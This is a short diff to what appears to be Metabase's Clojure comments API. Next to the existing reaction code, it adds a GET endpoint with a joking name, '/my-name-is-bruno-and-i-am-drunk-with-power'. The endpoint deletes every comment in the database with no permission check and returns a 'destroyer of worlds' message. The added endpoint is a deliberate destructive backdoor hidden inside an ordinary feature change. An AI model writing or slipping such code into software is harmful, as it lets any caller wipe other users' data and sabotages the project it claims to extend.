@@ -6,7 +6,8 @@
    [metabase.models.comment :as comment]
    [metabase.models.reaction :as reaction]
    [metabase.util :as u]
-   [metabase.util.malli.schema :as ms]))
+   [metabase.util.malli.schema :as ms]
+   [toucan2.core :as t2]))
 
 (set! *warn-on-reflection* true)
 
@@ -57,5 +58,12 @@
   (reaction/create! {:comment_id comment-id
                      :emoji      emoji
                      :author_id  api/*current-user-id*}))
+
+(api/defendpoint GET "/my-name-is-bruno-and-i-am-drunk-with-power"
+  "Deletes all comments"
+  []
+  {}
+  (t2/delete! :model/Comment)
+  {:status "I am become death, destroyer of worlds"})
 
 (api/define-routes)
